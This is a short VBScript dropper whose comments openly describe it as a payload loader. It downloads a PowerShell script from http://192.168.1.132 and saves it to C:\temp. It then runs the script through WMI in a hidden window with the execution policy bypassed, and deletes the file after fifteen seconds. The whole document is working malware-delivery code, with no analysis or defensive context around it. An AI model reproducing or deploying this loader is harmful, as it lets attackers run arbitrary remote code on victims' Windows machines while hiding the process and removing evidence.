Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
Dim filesys

'pull down payload

xHttp.Open "GET", "http://192.168.1.132/payload.ps1", False
xHttp.Send

'save to C:\Temp

with bStrm
	.type = 1
	.open
	.write xHttp.ResponseBody
	.savetofile "C:\temp\payload.ps1"
end with

'hide windows

Const HIDDEN_WINDOW = 0
 
strComputer = "."
 
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
 
Set objStartup = objWMIService.Get("Win32_ProcessStartup")
Set objConfig = objStartup.SpawnInstance_
objConfig.ShowWindow = HIDDEN_WINDOW
 
Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
 
'Execute payload

objProcess.Create "Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -file C:\Temp\payload.ps1", Null, objConfig, intProcessID

'wait 15 sec and delete payload

WScript.Sleep 15000

Set filesys = CreateObject("Scripting.FileSystemObject")
If filesys.FileExists("C:\Temp\payload.ps1") Then
filesys.DeleteFile "C:\Temp\payload.ps1"
End If
